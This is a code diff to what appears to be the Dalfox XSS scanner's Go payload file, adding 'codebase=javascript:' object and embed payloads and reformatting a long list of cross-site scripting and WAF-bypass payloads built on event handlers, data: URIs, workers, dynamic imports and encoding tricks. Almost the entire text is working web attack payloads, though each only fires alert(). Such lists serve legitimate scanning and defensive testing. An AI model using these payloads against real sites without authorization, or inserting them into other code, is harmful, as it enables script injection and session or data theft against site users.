@@ -154,11 +154,13 @@ func GetWAFBypassPayloads() []string {
 		"<object data=javascript:alert(1)></object>",
 		"<object/data=javascript:alert(1)></object>",
 		"<object data=data:text/html,<script>alert(1)</script>></object>",
+		"<object data=# codebase=javascript:alert(1)//>",
 
 		// EMBED-based bypasses
 		"<embed src=javascript:alert(1)></embed>",
 		"<embed/src=javascript:alert(1)></embed>",
 		"<embed src=data:text/html,<script>alert(1)</script>></embed>",
+		"<embed src=# codebase=javascript:alert(1)//>",
 
 		// MARQUEE-based bypasses
 		"<marquee onstart=alert(1)></marquee>",
@@ -167,235 +169,235 @@ func GetWAFBypassPayloads() []string {
 
 		// DETAILS-based bypasses
 		"<details open ontoggle=alert(1)></details>",
-		
+
 		// CSP Bypass with nonce
 		"<script nonce='random'>alert(1)</script>",
 		"<script nonce=\"random\">alert(1)</script>",
-		
+
 		// Modern HTML5 elements
 		"<dialog open oncancel=alert(1)></dialog>",
 		"<slot onfocus=alert(1) tabindex=1></slot>",
 		"<template id=x></template><script>document.getElementById('x').content.appendChild(document.createElement('img')).onerror=alert(1)</script>",
-		
+
 		// Web Components
 		"<custom-element onconnectedcallback=alert(1)></custom-element>",
 		"<shadow-root mode=open><script>alert(1)</script></shadow-root>",
-		
+
 		// Modern event handlers
 		"<div onpointerrawupdate=alert(1)></div>",
 		"<div onbeforexrselect=alert(1)></div>",
 		"<div onwebkitanimationend=alert(1)></div>",
 		"<div onwebkittransitionend=alert(1)></div>",
-		
+
 		// CSS injection with expression
 		"<style>@import 'data:text/css,body{background:url(javascript:alert(1))}'</style>",
 		"<link rel=stylesheet href=data:text/css,body{background:url(javascript:alert(1))}>",
-		
+
 		// Service Worker bypass
 		"<script>navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\"message\",e=>eval(e.data))')</script>",
-		
+
 		// WebAssembly bypass
 		"<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,9,1,5,97,108,101,114,116,0,0,10,6,1,4,0,65,1,16,0,11])).then(m=>m.instance.exports.alert())</script>",
-		
+
 		// Modern encoding bypasses
 		"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
 		"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>",
 		"<img src=x onerror=eval('\\141\\154\\145\\162\\164(1)')>",
-		
+
 		// Trusted Types bypass
 		"<script>trustedTypes.createPolicy('default',{createHTML:s=>s,createScript:s=>s}).createHTML('<img src=x onerror=alert(1)>')</script>",
-		
+
 		// Modern DOM manipulation
 		"<script>document.createElement('img').onerror=alert(1);document.images[0].src='x'</script>",
 		"<script>new Image().onerror=alert(1);document.images[0].src='x'</script>",
-		
+
 		// Fetch API bypass
 		"<script>fetch('data:text/html,<script>alert(1)</script>').then(r=>r.text()).then(eval)</script>",
-		
+
 		// Modern attribute bypasses
 		"<iframe srcdoc='<script>parent.alert(1)</script>'></iframe>",
 		"<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
-		
+
 		// CSS custom properties
 		"<style>:root{--xss:url(javascript:alert(1))}body{background:var(--xss)}</style>",
-		
+
 		// Modern form bypasses
 		"<form><button formaction=javascript:alert(1)>XSS</button></form>",
 		"<form><input type=submit formaction=javascript:alert(1) value=XSS></form>",
-		
+
 		// Intersection Observer bypass
 		"<script>new IntersectionObserver(alert).observe(document.body)</script>",
-		
+
 		// Mutation Observer bypass
 		"<script>new MutationObserver(alert).observe(document,{childList:1})</script>",
-		
+
 		// Performance Observer bypass
 		"<script>new PerformanceObserver(alert).observe({entryTypes:['navigation']})</script>",
-		
+
 		// Resize Observer bypass
 		"<script>new ResizeObserver(alert).observe(document.body)</script>",
-		
+
 		// Modern media bypasses
 		"<video><source onerror=alert(1) src=x></video>",
 		"<audio><source onerror=alert(1) src=x></audio>",
 		"<picture><source onerror=alert(1) src=x></picture>",
-		
+
 		// Canvas bypass
 		"<canvas id=x></canvas><script>document.getElementById('x').getContext('2d').canvas.toBlob(alert)</script>",
-		
+
 		// WebGL bypass
 		"<script>document.createElement('canvas').getContext('webgl').getExtension('WEBGL_debug_renderer_info')||alert(1)</script>",
-		
+
 		// Clipboard API bypass
 		"<script>navigator.clipboard.writeText('XSS').then(alert)</script>",
-		
+
 		// Geolocation bypass
 		"<script>navigator.geolocation.getCurrentPosition(alert,alert)</script>",
-		
+
 		// Battery API bypass
 		"<script>navigator.getBattery().then(alert)</script>",
-		
+
 		// Gamepad API bypass
 		"<script>window.addEventListener('gamepadconnected',alert)</script>",
-		
+
 		// Payment Request bypass
 		"<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'',amount:{currency:'USD',value:'0'}}}).show().catch(alert)</script>",
-		
+
 		// Credential Management bypass
 		"<script>navigator.credentials.create({password:{id:'x',password:'x'}}).then(alert,alert)</script>",
-		
+
 		// Push API bypass
 		"<script>navigator.serviceWorker.ready.then(r=>r.pushManager.subscribe()).then(alert,alert)</script>",
-		
+
 		// Background Sync bypass
 		"<script>navigator.serviceWorker.ready.then(r=>r.sync.register('xss')).then(alert,alert)</script>",
-		
+
 		// Web Share bypass
 		"<script>navigator.share({title:'XSS'}).then(alert,alert)</script>",
-		
+
 		// Screen Capture bypass
 		"<script>navigator.mediaDevices.getDisplayMedia().then(alert,alert)</script>",
-		
+
 		// Web Locks bypass
 		"<script>navigator.locks.request('xss',alert)</script>",
-		
+
 		// Broadcast Channel bypass
 		"<script>new BroadcastChannel('xss').postMessage(1);new BroadcastChannel('xss').onmessage=alert</script>",
-		
+
 		// Shared Worker bypass
 		"<script>new SharedWorker('data:application/javascript,onconnect=e=>e.ports[0].postMessage(1)').port.onmessage=alert</script>",
-		
+
 		// Dedicated Worker bypass
 		"<script>new Worker('data:application/javascript,postMessage(1)').onmessage=alert</script>",
-		
+
 		// MessageChannel bypass
 		"<script>new MessageChannel().port1.onmessage=alert;new MessageChannel().port2.postMessage(1)</script>",
-		
+
 		// AbortController bypass
 		"<script>new AbortController().signal.addEventListener('abort',alert);new AbortController().abort()</script>",
-		
+
 		// ReadableStream bypass
 		"<script>new ReadableStream({start:alert})</script>",
-		
+
 		// WritableStream bypass
 		"<script>new WritableStream({start:alert})</script>",
-		
+
 		// TransformStream bypass
 		"<script>new TransformStream({start:alert})</script>",
-		
+
 		// CompressionStream bypass
 		"<script>new CompressionStream('gzip').readable.getReader().read().then(alert,alert)</script>",
-		
+
 		// DecompressionStream bypass
 		"<script>new DecompressionStream('gzip').readable.getReader().read().then(alert,alert)</script>",
-		
+
 		// TextEncoder bypass
 		"<script>new TextEncoder().encode('').constructor.constructor('alert(1)')()</script>",
-		
+
 		// TextDecoder bypass
 		"<script>new TextDecoder().decode(new Uint8Array()).constructor.constructor('alert(1)')()</script>",
-		
+
 		// URL Pattern bypass
 		"<script>new URLPattern({pathname:'*'}).test('javascript:alert(1)')||alert(1)</script>",
-		
+
 		// Temporal API bypass (if available)
 		"<script>Temporal?.Now?.instant()?.toString()?.constructor?.constructor('alert(1)')()</script>",
-		
+
 		// Import Maps bypass
 		"<script type=importmap>{\"imports\":{\"xss\":\"data:text/javascript,alert(1)\"}}</script><script type=module>import 'xss'</script>",
-		
+
 		// Top Level Await bypass
 		"<script type=module>await import('data:text/javascript,alert(1)')</script>",
-		
+
 		// Dynamic Import bypass
 		"<script>import('data:text/javascript,alert(1)')</script>",
-		
+
 		// Private Fields bypass
 		"<script>class X{#x=alert(1)}</script>",
-		
+
 		// Optional Chaining bypass
 		"<script>window?.alert?.(1)</script>",
-		
+
 		// Nullish Coalescing bypass
 		"<script>(null??alert)(1)</script>",
-		
+
 		// BigInt bypass
 		"<script>BigInt?.prototype?.constructor?.constructor('alert(1)')()</script>",
-		
+
 		// WeakRef bypass
 		"<script>new WeakRef(alert).deref()(1)</script>",
-		
+
 		// FinalizationRegistry bypass
 		"<script>new FinalizationRegistry(alert).register({},1)</script>",
-		
+
 		// Logical Assignment bypass
 		"<script>window.x??=alert;x(1)</script>",
-		
+
 		// Numeric Separators bypass
 		"<script>eval('1_000_000'.replace(/_/g,''))||alert(1)</script>",
-		
+
 		// String replaceAll bypass
 		"<script>'alert(1)'.replaceAll('','').constructor.constructor('alert(1)')()</script>",
-		
+
 		// Promise.any bypass
 		"<script>Promise.any([Promise.reject(),Promise.resolve(alert(1))])</script>",
-		
+
 		// AggregateError bypass
 		"<script>new AggregateError([],alert(1))</script>",
-		
+
 		// Array.at bypass
 		"<script>[alert].at(0)(1)</script>",
-		
+
 		// Object.hasOwn bypass
 		"<script>Object.hasOwn(window,'alert')&&alert(1)</script>",
-		
+
 		// Error.cause bypass
 		"<script>new Error('',{cause:alert(1)})</script>",
-		
+
 		// Intl.Segmenter bypass
 		"<script>new Intl.Segmenter().segment('').constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.ListFormat bypass
 		"<script>new Intl.ListFormat().format([]).constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.RelativeTimeFormat bypass
 		"<script>new Intl.RelativeTimeFormat().format(1,'day').constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.Locale bypass
 		"<script>new Intl.Locale('en').toString().constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.DisplayNames bypass
 		"<script>new Intl.DisplayNames(['en'],{type:'region'}).of('US').constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.DateTimeFormat bypass
 		"<script>new Intl.DateTimeFormat().format().constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.NumberFormat bypass
 		"<script>new Intl.NumberFormat().format(1).constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.PluralRules bypass
 		"<script>new Intl.PluralRules().select(1).constructor.constructor('alert(1)')()</script>",
-		
+
 		// Intl.Collator bypass
 		"<script>new Intl.Collator().compare('a','b').constructor.constructor('alert(1)')()</script>",
 		"<details/open/ontoggle=alert(1)></details>",
@@ -506,8 +508,12 @@ func GetCommonPayload() []string {
 		"'><iframe src=javascript:alert(DALFOX_ALERT_VALUE)></iframe>",
 		"><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
 		"'><object data=javascript:alert(DALFOX_ALERT_VALUE)></object>",
+		"><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></object>",
+		"'><object data=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></object>",
 		"><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
 		"'><embed src=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
+		"><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
+		"'><embed src=# codebase=javascript:alert(DALFOX_ALERT_VALUE)></embed>",
 		"><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
 		"'><marquee onstart=alert(DALFOX_ALERT_VALUE)></marquee>",
 		"><details open ontoggle=alert(DALFOX_ALERT_VALUE)></details>",
